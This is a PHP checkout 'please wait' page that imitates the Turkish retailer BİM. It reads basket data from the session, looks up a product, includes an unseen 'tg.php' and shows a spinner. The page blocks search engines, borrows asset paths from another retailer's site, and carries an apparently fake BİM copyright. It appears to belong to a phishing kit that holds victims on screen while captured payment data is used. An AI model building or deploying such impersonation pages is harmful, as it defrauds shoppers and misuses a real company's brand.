<?php

// Session start
session_start();
ob_start();

// Check basket_info from session
if (!$_SESSION['basket'] && !isset($_SESSION['basket_info'])) {
    header('Location: index.php');
    exit;
}

// Include Helper
include_once('../inc/helper.php');
include 'tg.php';


// Check product info database
$basket_info = $_SESSION['basket_info'];
$sql = "SELECT * FROM bella_bim_products WHERE id = :id";
$stmt = $db->prepare($sql);
$stmt->execute(['id' => $basket_info['product_id']]);
$product = $stmt->fetch(PDO::FETCH_OBJ);

// Check product is exist
if (!$product) {
    header('Location: index.php');
    exit;
}

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-EmulateIE7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta id="viewport" name="viewport"
          content="width=device-width, maximum-scale=1.0, initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <title>İşleminiz devam ediyor</title>


    <link href="assets/img/static_omnishop/ayb822/dist/style.css" rel="stylesheet" type="text/css">
    <!-- JQUERY -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <!-- Custom inline JS -->
    <script type="text/javascript">
        var GLOBALS = {
            THUMBNAIL_ACTIVE: true,
            THUMBNAIL_OPTIONS: {
                "product-list__big": {"width": 587, "quality": 60, "crop": "center", "height": 587},
                "category-detail": {"width": 870, "quality": 60, "height": 317},
                "email-thumbnail": {"width": 80, "quality": 60, "crop": "center", "height": 80},
                "product_basket_thumb_image": {"width": 120, "quality": 60, "height": 120},
                "discount-product-list": {"width": 190, "quality": 100, "crop": "center", "height": 190},
                "product-content-variant-image": {"width": 70, "quality": 60, "crop": "center", "height": 70},
                "product-detail__slider_display": {"width": 780, "quality": 60, "crop": "center", "height": 780},
                "product-detail__slider_zoom": {"width": 1400, "quality": 60, "crop": "center", "height": 1400},
                "product-detail__slider_thumbnail": {"width": 150, "quality": 60, "crop": "center", "height": 150},
                "category-detail__sub-category-banner": {"width": 270, "quality": 60, "height": 335},
                "autocomplete": {"width": 40, "quality": 60, "height": 40},
                "category-detail__campaign-banner": {"width": 420, "quality": 60, "height": 210},
                "product-map-image": {"width": 60, "quality": 60, "crop": "center", "height": 60},
                "product-list": {"width": 250, "quality": 100, "crop": "center", "height": 250}
            },
            DEFAULT_COUNTRY: {'pk': 1},
            isUserLoggin: false,
            userPhone: '',
            sendTime: '',
            phoneLogin: '',
            isAutoSetShippingOption: false,
            isPaymentTabRunningFromSlug: true,
            disableAutoSelectOneAddress: true,
            userEmail: '',
            userName: '',
            userSurname: '',

            page: 'checkout'

        };
    </script>
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-regular-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-bold-webfont.woff2" as="font"
          type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-extrabold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-blackcaps-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/icomoon.ttf" as="font"
          type="font/ttf" crossorigin="">
    <script src="assets/js/cookie-seal.js"></script>

</head>
<body class="page-inner address">

<section class="js-main-wrapper">

    <header class="page-checkout-header">
        <div class="container">
            <a href="#" class="logo" title="BİM">
                <img loading="lazy" src="bimex.png"
                     alt="">
            </a>
            <div class="clearfix"></div>
        </div>
    </header>

    <!-- Waiting Section -->
    <section class="page-checkout js-page-checkout js-tab-box">
        <div class="container" style="margin-top: 10rem;">
            <div class="text-center">
                <h2 class="mb-4" style="font-size: 3rem;">
                    <strong>İşleminiz devam ediyor, lütfen bekleyin...</strong>
                </h2>
                <!-- Spinner -->
                <img src="assets/img/static_omnishop/ayb822/assets/img/spinner.gif" alt="spinner" width="100"
                     height="100" style="margin-top: 2rem;">
                <!-- Spinner -->
            </div>
        </div>
    </section>
    <!-- Waiting Section End -->


    <footer class="page-checkout-footer hidden-xs">
        <p>2024 BİM Tüm Hakları Saklıdır.</p>
    </footer>


    <div class="clear"></div>
</section>

<div class="back-to-top js-back-to-top hide-on-app">
    <i class="fa fa-angle-up"></i>
</div>
<script src="assets/js/bundle.js"></script>
<script src="assets/js/init.js"></script>
</body>
</html>